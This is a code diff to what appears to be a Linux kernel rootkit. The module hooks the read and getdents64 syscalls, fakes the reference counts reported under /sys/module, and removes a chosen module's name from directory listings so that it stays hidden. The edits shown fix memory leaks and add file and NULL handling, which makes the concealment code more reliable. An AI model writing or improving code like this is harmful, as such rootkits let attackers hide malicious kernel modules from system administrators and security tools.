@@ -46,10 +46,8 @@ void notrace callback_func_base(struct pt_regs *regs, unsigned long parent_ip, u
     }
 }
 
-char* get_file_path_from_file_struct(struct file *file) {
-    char *path;
-    path = kmalloc(PATH_MAX, GFP_KERNEL);
-    path = d_path(&file->f_path, path, PATH_MAX);
+char* get_file_path_from_file_struct(char *path, struct file *file) {
+    
 
     return path;
 }
@@ -78,7 +76,10 @@ ssize_t new_read(const struct pt_regs *regs) {
         return bytes_read;
     }
 
-    char *path = get_file_path_from_file_struct(file);
+    char *allocated_path_pointer;
+    allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
+    char *path;
+    path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
         
     if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, refcount_path) != NULL) && bytes_read > 0) {
         char *current_module_name = file->f_path.dentry->d_parent->d_iname;
@@ -103,13 +104,15 @@ ssize_t new_read(const struct pt_regs *regs) {
                 char *new_value = kmalloc(bytes_read, GFP_KERNEL);
                 sprintf(new_value, "%d\n", new_refcount);
                 copy_to_user(buf_pointer, new_value, bytes_read);
+                kfree(new_value);
 
                 return bytes_read;       
             }
         }
-        
     }
-
+    
+    kfree(allocated_path_pointer);
+    fput(file);
     return bytes_read;
 }
 
@@ -142,7 +145,15 @@ int new_getdents64(const struct pt_regs *regs) {
             curr = first + i;
 
             struct file *file = fget((int)regs->di);
-            char *path = get_file_path_from_file_struct(file);
+            if (file == NULL) {
+                continue;
+            }
+
+            char *allocated_path_pointer;
+            allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
+            char *path;
+            path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
+
             if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
                 printk(KERN_ALERT "Hiding %s from %s using get_dents64", mod_name_to_hide, path);    
                 has_been_found = true;
@@ -156,8 +167,12 @@ int new_getdents64(const struct pt_regs *regs) {
                 continue;
             }
 
+            kfree(allocated_path_pointer);
+            fput(file);
             i += curr->d_reclen;
         }
+
+        kfree(first);
     }
 
     if (has_been_found) {
